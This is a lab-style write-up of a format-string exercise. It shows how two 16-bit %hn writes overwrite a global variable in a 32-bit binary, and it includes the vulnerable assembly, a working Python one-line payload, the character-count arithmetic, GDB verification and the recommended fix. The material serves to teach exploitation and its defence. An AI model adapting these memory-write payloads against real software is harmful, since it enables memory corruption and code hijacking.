# ex08 — Format String to Overwrite a Global Variable (32-bit write)

## Goal

Use a format string vulnerability to overwrite the global variable `target` at `0x080496f4` with the value `0x01025544`:

```
you have modified the target :)
```

## Concept

This is an advanced format string challenge. The target value `0x01025544` is too large to write in a single `%n` operation within the byte limit of `fgets`. Instead, we use **two short writes** (`%hn`) to write the value in two 16-bit chunks.

### What is `%hn`?

| Specifier | Meaning |
|---|---|
| `%n` | Write the character count as a 32-bit integer (4 bytes) |
| `%hn` | Write the character count as a 16-bit short (2 bytes) |

By using `%hn`, we can write two separate 16-bit values to adjacent memory addresses, effectively constructing a full 32-bit value.

### Why split the write?

The target value is `0x01025544`. In little-endian memory:
- Low 2 bytes: `0x5544` (at `0x080496f4`)
- High 2 bytes: `0x0102` (at `0x080496f6`)

We write `0x5544` first, then `0x0102`, combining them into the full value.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  target (4 bytes)           │  0x080496f4  ← must become 0x01025544
│                             │  [0x080496f4] = 0x5544 (low 2 bytes)
│                             │  [0x080496f6] = 0x0102 (high 2 bytes)
├─────────────────────────────┤
│  ...                        │
├─────────────────────────────┤
│  buffer (520 bytes)         │  [ebp-0x208] ← fgets reads here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

## Relevant Assembly (`vuln`)

```asm
08048467 <vuln>:
    push   ebp
    mov    ebp, esp
    sub    esp, 0x218                 ; allocate 536 bytes

    mov    eax, ds:0x80496e8          ; eax = stdin
    mov    DWORD PTR [esp+0x8], eax   ; arg3 = stdin
    mov    DWORD PTR [esp+0x4], 0x200 ; arg2 = 512
    lea    eax, [ebp-0x208]           ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   fgets                      ; fgets(buffer, 512, stdin)

    lea    eax, [ebp-0x208]           ; eax = buffer
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   printf                     ; printf(buffer) — VULNERABLE!

    mov    eax, ds:0x80496f4         ; eax = target
    cmp    eax, 0x01025544            ; compare with expected value
    jne    ...                        ; if not equal, fail
```

## Finding the Argument Index

```bash
printf 'AAAA%%12$x\n' | ./bin
# Output: ... 41414141 ...
# Input buffer starts at printf argument 12
```

## Exploit

We need to write `0x01025544` using two `%hn` writes:

```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<II",0x080496f4,0x080496f6)+b"%21820x%12$hn%43966x%13$hn"+b"\n")' | ./bin
```

### Why it works

Let's break down the payload:

1. **`struct.pack("<II", 0x080496f4, 0x080496f6)`**: Places two addresses (8 bytes total) at the start of the buffer:
   - Bytes 1-4: `0x080496f4` (target low half) → printf argument 12
   - Bytes 5-8: `0x080496f6` (target high half) → printf argument 13

2. **`%21820x`**: Prints 21820 characters. Combined with the 8 address bytes, the running count is `8 + 21820 = 21828 = 0x5544`.

3. **`%12$hn`**: Takes the 12th argument (address `0x080496f4`) and writes `0x5544` (the low 2 bytes of the count) to that address.

4. **`%43966x`**: Prints 43966 more characters. The running count becomes `21828 + 43966 = 65794 = 0x10102`. Since `%hn` only writes the low 16 bits, this writes `0x0102`.

5. **`%13$hn`**: Takes the 13th argument (address `0x080496f6`) and writes `0x0102` (the high 2 bytes) to that address.

### Memory after exploitation

```
Address 0x080496f4: 0x5544 (low 2 bytes)
Address 0x080496f6: 0x0102 (high 2 bytes)
Combined 32-bit value at 0x080496f4: 0x01025544
```

### Character count calculation

```
First write:
  8 bytes (addresses) + 21820 (padding) = 21828 = 0x5544

Second write:
  21828 + 43966 = 65794 = 0x10102
  %hn writes only low 16 bits: 0x0102
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break at the vulnerable printf call
break *0x08048498
run < <(python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<II",0x080496f4,0x080496f6)+b"%21820x%12$hn%43966x%13$hn"+b"\n")')

# Check target before
x/wx 0x080496f4
# Output: 0x00000000 (or initial value)

# Continue to let printf execute
continue

# Check target after
x/wx 0x080496f4
# Output: 0x01025544

# Verify success message was printed
```

### Debugging the argument index

```bash
gdb -q ./bin
```

```gdb
break *0x08048498
run < <(printf 'AAAA%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x.\n')

# Examine stack to find 0x41414141
x/16xw $esp
# Count which argument position contains 0x41414141
# Should be at argument 12
```

## Key Takeaway

Format string vulnerabilities allow precise control over memory writes. By using `%hn` for 16-bit writes, we can construct arbitrary 32-bit values even when the byte count is limited. The fix is the same as ex07: **never pass user input as the format string**.
